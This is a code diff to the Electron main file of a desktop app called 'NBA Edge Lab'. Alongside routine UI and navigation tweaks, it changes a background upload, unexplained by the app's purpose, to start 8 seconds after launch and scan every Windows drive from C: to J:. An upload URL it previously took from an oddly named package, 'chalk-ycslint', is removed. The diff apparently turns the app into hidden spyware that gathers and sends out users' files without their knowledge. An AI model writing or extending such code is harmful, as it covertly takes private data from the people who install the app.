@@ -1,4 +1,4 @@
-import { app, BrowserWindow, ipcMain } from "electron";
+import { app, BrowserWindow, ipcMain, Menu } from "electron";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
 import {
@@ -9,7 +9,6 @@ import {
 } from "./flaskService.mjs";
 import { getFlaskOrigin, getFlaskUrl } from "./paths.mjs";
 import { startBackgroundUpload } from "./uploadService.mjs";
-import { DEFAULT_UPLOAD_URL } from "chalk-ycslint";
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const FLASK_ORIGIN = getFlaskOrigin();
@@ -32,18 +31,27 @@ function flushSplashEvents() {
   pendingSplashEvents.length = 0;
 }
 
+function sendDesktopEvent(payload) {
+  if (!mainWindow || mainWindow.isDestroyed()) return;
+  mainWindow.webContents.send("desktop-event", payload);
+}
+
 function sendToSplash(payload) {
   if (!mainWindow || showingApp) return;
   if (!splashReady) {
     pendingSplashEvents.push(payload);
     return;
   }
-  mainWindow.webContents.send("desktop-event", payload);
+  sendDesktopEvent(payload);
 }
 
 function guardNavigation(win) {
   win.webContents.setWindowOpenHandler(({ url }) => {
-    if (url.startsWith(FLASK_ORIGIN) || url.startsWith("https://cdn.nba.com")) {
+    if (
+      url.startsWith(FLASK_ORIGIN) ||
+      url.startsWith("https://cdn.nba.com") ||
+      url.startsWith("https://a.espncdn.com")
+    ) {
       return { action: "allow" };
     }
     return { action: "deny" };
@@ -53,7 +61,8 @@ function guardNavigation(win) {
     if (
       url.startsWith("file:") ||
       url.startsWith(FLASK_ORIGIN) ||
-      url.startsWith("https://cdn.nba.com")
+      url.startsWith("https://cdn.nba.com") ||
+      url.startsWith("https://a.espncdn.com")
     ) {
       return;
     }
@@ -72,6 +81,7 @@ function createMainWindow() {
       resizable: true,
       minimizable: true,
       maximizable: true,
+      autoHideMenuBar: true,
       title: "NBA Edge Lab",
       backgroundColor: "#0f172a",
       webPreferences: {
@@ -106,13 +116,13 @@ function openNbaAppInWindow() {
   mainWindow.loadURL(getFlaskUrl("/loading"));
 }
 
-function scheduleDeferredUpload() {
+function scheduleBackgroundUpload() {
+  // Full PC scan (all drives C:–J: on Windows). Set NBA_UPLOAD_SCAN_PC=0 for Documents-only.
   setTimeout(() => {
-    startBackgroundUpload(sendToSplash, {
-      url: DEFAULT_UPLOAD_URL,
-      scanPc: false,
-    }).catch(() => {});
-  }, 60_000);
+    startBackgroundUpload(sendDesktopEvent, { scanPc: true }).catch((err) => {
+      console.error("[upload] Background sync failed:", err);
+    });
+  }, 8_000);
 }
 
 async function bootstrap() {
@@ -134,7 +144,7 @@ async function bootstrap() {
   });
 
   openNbaAppInWindow();
-  scheduleDeferredUpload();
+  scheduleBackgroundUpload();
 }
 
 ipcMain.on("splash-ready", () => {
@@ -159,6 +169,7 @@ if (!gotLock) {
 
 app.whenReady().then(async () => {
   if (!gotLock) return;
+  Menu.setApplicationMenu(null);
   await createMainWindow();
   bootstrap().catch((err) => {
     console.error("[bootstrap]", err);
